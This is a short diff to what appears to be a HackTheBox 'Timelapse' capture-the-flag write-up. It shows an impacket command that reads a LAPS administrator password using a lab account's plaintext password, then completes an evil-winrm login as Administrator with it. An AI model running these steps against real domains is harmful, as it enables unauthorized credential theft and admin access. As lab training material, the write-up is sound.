@@ -407,7 +407,7 @@ impacket-GetLAPSPassword timelapse.htb/svc_deploy:'E3R$Q62^12p7PLlC%KWaxuaV' -dc
 ![image.png](/assets/Images//HTB_Timelapse/image%206.png)
 
 ```bash
-evil-winrm -i
+evil-winrm -i $IP -u 'Administrator' -p '<LAPSPASSWORD>'
 ```
 
 ---
